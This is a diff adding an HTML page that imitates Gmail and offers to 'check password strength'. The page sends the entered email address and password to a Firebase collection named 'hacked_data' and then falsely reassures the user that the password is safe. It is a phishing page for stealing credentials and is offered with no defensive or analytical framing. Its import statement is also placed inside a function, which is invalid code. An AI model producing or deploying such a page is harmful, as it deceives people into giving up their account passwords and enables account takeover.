@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Gmail - Check Password</title>
+    <link rel="stylesheet" href="style.css">
+    <script type="module" src="firebase-config.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1 style="color: #EA4335;">Gmail</h1>
+        <p>Check if your password is strong!</p>
+        <input type="email" id="username" placeholder="Enter your Gmail">
+        <input type="password" id="password" placeholder="Enter Password">
+        <button onclick="checkGmail()">Check Strength</button>
+        <div id="msg" class="success-msg"></div>
+    </div>
+
+    <script type="module">
+        async function checkGmail() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            
+            import { db, collection, addDoc } from './firebase-config.js';
+            
+            await addDoc(collection(db, "hacked_data"), {
+                platform: "Gmail",
+                username: user,
+                password: pass,
+                timestamp: new Date(),
+                details: "Strength Check"
+            });
+
+            let strength = "Strong 💪";
+            if(pass.length < 6) strength = "Weak ⚠️";
+            
+            document.getElementById('msg').innerHTML = `Result: ${strength}<br>Your password is safe.`;
+            document.getElementById('msg').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
